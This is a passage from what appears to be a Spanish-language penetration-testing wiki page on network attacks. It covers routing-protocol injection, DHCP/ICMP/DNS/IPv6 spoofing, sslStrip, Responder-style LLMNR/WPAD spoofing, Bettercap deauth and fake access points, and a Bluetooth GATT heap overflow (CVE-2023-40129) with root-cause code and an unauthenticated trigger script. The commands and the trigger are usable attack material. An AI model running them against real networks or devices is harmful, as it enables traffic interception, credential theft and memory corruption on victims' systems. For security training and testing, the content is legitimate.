- **RIPng:** Utiliza el puerto UDP 521 para emitir datagramas vía multicast IPv6.

Tenga en cuenta que RIPv2 soporta autenticación MD5, mientras que RIPng no incluye autenticación nativa y depende de los encabezados IPsec AH y ESP en IPv6.

### Ataques EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** es un protocolo de enrutamiento dinámico. **Es un protocolo de vector-distancia.** Si no hay **autenticación** y no se configuran interfaces en modo passive, un **intruso** puede interferir con el enrutamiento EIGRP y provocar **envenenamiento de las tablas de enrutamiento**. Además, la red EIGRP (es decir, el sistema autónomo) **es plana y no tiene segmentación en zonas**. Si un **atacante inyecta una ruta**, es probable que esa ruta se **propague** por todo el sistema autónomo EIGRP.

Para atacar un sistema EIGRP se requiere **establecer una vecindad con un router EIGRP legítimo**, lo que abre muchas posibilidades, desde reconocimiento básico hasta diversas inyecciones.

[**FRRouting**](https://frrouting.org/) te permite implementar **un router virtual que soporta BGP, OSPF, EIGRP, RIP y otros protocolos.** Solo tienes que desplegarlo en el sistema del atacante y en realidad puedes hacerte pasar por un router legítimo en el dominio de enrutamiento.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) tiene capacidades para interceptar broadcasts de EIGRP (Enhanced Interior Gateway Routing Protocol). También permite la inyección de paquetes, que pueden utilizarse para alterar configuraciones de enrutamiento.

### OSPF

En el protocolo Open Shortest Path First (OSPF) **la autenticación MD5 se emplea comúnmente para asegurar la comunicación entre routers**. Sin embargo, esta medida de seguridad puede ser comprometida usando herramientas como Loki y John the Ripper. Estas herramientas son capaces de capturar y crackear hashes MD5, exponiendo la clave de autenticación. Una vez obtenida esta clave, puede usarse para introducir nueva información de enrutamiento. Para configurar los parámetros de ruta y establecer la clave comprometida se utilizan, respectivamente, las pestañas _Injection_ y _Connection_.

- **Captura y cracking de hashes MD5:** Se usan herramientas como Loki y John the Ripper para este propósito.
- **Configurar parámetros de ruta:** Esto se realiza a través de la pestaña _Injection_.
- **Establecer la clave comprometida:** La clave se configura en la pestaña _Connection_.

### Otras herramientas y fuentes genéricas

- [**Above**](https://github.com/c4s73r/Above): Herramienta para escanear tráfico de red y encontrar vulnerabilidades
- Puedes encontrar **más información sobre ataques de red** [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

El atacante configura todos los parámetros de red (GW, IP, DNS) del nuevo miembro de la red enviando respuestas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Consulta la [sección anterior](#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste en enviar un ICMP packet type 1 code 5 que indica que el attacker es la mejor manera para llegar a una IP. Luego, cuando la victim quiera contactar esa IP, enviará el packet a través del attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

El atacante resolverá algunos (o todos) los dominios que la víctima solicite.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar tu propio DNS con dnsmasq**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Puertas de enlace locales

A menudo existen múltiples rutas hacia sistemas y redes. Después de crear una lista de direcciones MAC dentro de la red local, usa _gateway-finder.py_ para identificar hosts que soportan IPv4 forwarding.

<details>
<summary>ejemplo de uso de gateway-finder</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Para la resolución local de hosts cuando las consultas DNS fallan, los sistemas Microsoft dependen de **Link-Local Multicast Name Resolution (LLMNR)** y del **NetBIOS Name Service (NBT-NS)**. De manera similar, las implementaciones de **Apple Bonjour** y **Linux zero-configuration** utilizan **Multicast DNS (mDNS)** para descubrir sistemas dentro de una red. Debido a la naturaleza no autenticada de estos protocolos y a su operación sobre UDP, enviando mensajes broadcast, pueden ser explotados por atacantes que buscan redirigir a los usuarios a servicios maliciosos.

You can impersonate services that are searched by hosts using Responder to send fake responses.\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Los navegadores suelen emplear el protocolo **Web Proxy Auto-Discovery (WPAD)** para adquirir automáticamente la configuración del proxy. Esto implica obtener detalles de configuración desde un servidor, concretamente mediante una URL como "http://wpad.example.org/wpad.dat". El descubrimiento de este servidor por parte de los clientes puede ocurrir por varios mecanismos:

- A través de **DHCP**, donde el descubrimiento se facilita utilizando una entrada con el código especial 252.
- Mediante **DNS**, que implica buscar un nombre de host denominado _wpad_ dentro del dominio local.
- Vía **Microsoft LLMNR and NBT-NS**, que son mecanismos de fallback usados cuando las consultas DNS no tienen éxito.

La herramienta Responder aprovecha este protocolo actuando como un **servidor WPAD malicioso**. Utiliza DHCP, DNS, LLMNR y NBT-NS para engañar a los clientes y hacer que se conecten a él. To dive deeper into how services can be impersonated using Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

You can offer different services in the network to try to **trick a user** to enter some **plain-text credentials**. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

This attack is very similar to ARP Spoofing but in the IPv6 world. You can get the victim think that the IPv6 of the GW has the MAC of the attacker.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Algunos OS configuran por defecto la puerta de enlace a partir de los paquetes RA enviados en la red. Para declarar al atacante como router IPv6 puedes usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Por defecto, algunos OS intentan configurar el DNS leyendo un paquete DHCPv6 en la red. Entonces, un atacante podría enviar un paquete DHCPv6 para configurarse a sí mismo como DNS. El DHCP también proporciona una dirección IPv6 a la víctima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (página falsa e inyección de código JS)

## Ataques en Internet

### sslStrip

Básicamente lo que hace este ataque es que, en caso de que el **user** intente **access** una página **HTTP** que está **redirecting** a la versión **HTTPS**. **sslStrip** will **maintain** a **HTTP connection with** the **client and** a **HTTPS connection with** the **server**, por lo que será capaz de **sniff** la conexión en **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Más info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy para evadir HSTS

La **diferencia** entre **sslStrip+ and dns2proxy** frente a **sslStrip** es que **redirigirán** por ejemplo _**www.facebook.com**_ **a** _**wwww.facebook.com**_ (nota la **"w"** **extra**) y fijarán la **dirección de ese dominio como la IP del attacker**. De este modo, el **client** se **conectará** a _**wwww.facebook.com**_ **(el attacker)** pero detrás de escena **sslstrip+** **mantendrá** la **conexión real** vía https con **www.facebook.com**.

El **objetivo** de esta técnica es **evitar HSTS** porque _**wwww**.facebook.com_ **no será** guardado en la **cache** del browser, por lo que el browser será engañado para realizar la **autenticación en facebook vía HTTP**.\
Nótese que para realizar este ataque la víctima tiene que intentar acceder inicialmente a [http://www.faceook.com](http://www.faceook.com) y no a https. Esto puede hacerse modificando los enlaces dentro de una página http.

Más info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen en puerto
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL escucha en puerto

#### Generar claves y certificado autofirmado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Escuchar usando certificado
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Escuchar usando un certificado y redirigir a los hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Some times, if the client checks that the CA is a valid one, you could **serve a certificate of other hostname signed by a CA**.\
Otra prueba interesante es servir un c**ertificate of the requested hostname but self-signed**.

Otras cosas para probar son intentar firmar el certificate con un certificate válido que no sea una CA válida. O usar la valid public key, forzar el uso de un algoritmo como diffie hellman (uno que no necesite desencriptar nada con la real private key) y cuando el cliente solicite una prueba de la real private key (como un hash) enviar una prueba falsa y esperar que el cliente no la compruebe.

## Bettercap

<details>
<summary>Comandos comunes de Bettercap</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Notas de descubrimiento activo

Ten en cuenta que cuando se envía un paquete UDP a un dispositivo que no tiene el puerto solicitado, se envía un ICMP (Port Unreachable).

### Descubrimiento ARP

Los paquetes ARP se usan para descubrir qué IPs están en uso dentro de la red. El PC tiene que enviar una petición para cada dirección IP posible y solo las que estén en uso responderán.

### mDNS (multicast DNS)

Bettercap envía una solicitud MDNS (cada X ms) pidiendo **\_services\_.dns-sd.\_udp.local**; la máquina que vea este paquete normalmente responde a esa solicitud. Luego, solo busca máquinas que respondan a "services".

**Herramientas**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### NBNS (NetBios Name Server)

Bettercap envía paquetes broadcast al puerto 137/UDP preguntando por el nombre "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### SSDP (Simple Service Discovery Protocol)

Bettercap envía paquetes SSDP en broadcast buscando todo tipo de servicios (puerto UDP 1900).

### WSD (Web Service Discovery)

Bettercap envía paquetes WSD en broadcast buscando servicios (puerto UDP 3702).


## Ataques Bluetooth (L2CAP/ATT/GATT)

- Android Fluoride expone servicios sobre L2CAP PSMs (p.ej., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Los servicios se registran vía:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- El framework BlueBlue permite crafting L2CAP/ATT basado en Scapy (construido sobre BlueBorne l2cap_infra). Ejemplo:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): subdesbordamiento de enteros en el response builder Read Multiple Variable puede causar un ~64KB heap overflow cuando MTU trunca un elemento de longitud variable pero no se tiene en cuenta el campo de longitud +2.

<details>
<summary>Causa raíz (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- En entradas de longitud variable, la ruta de overflow resta solo (total_len - mtu), ignorando el campo de longitud +2, por lo que len underflows (p. ej., 0xFFFE) y memcpy escribe ~64KB más allá del final del buffer.
</details>

- Disparador mínimo sin autenticación (MTU pequeña fuerza un underflow en el 4th attribute):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Telecom / Núcleo móvil (GTP) Explotación


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Referencias

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Evaluación de seguridad de redes: Conoce tu red (3.ª edición)**
- **Practical IoT Hacking: La guía definitiva para atacar el Internet de las cosas. Por Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
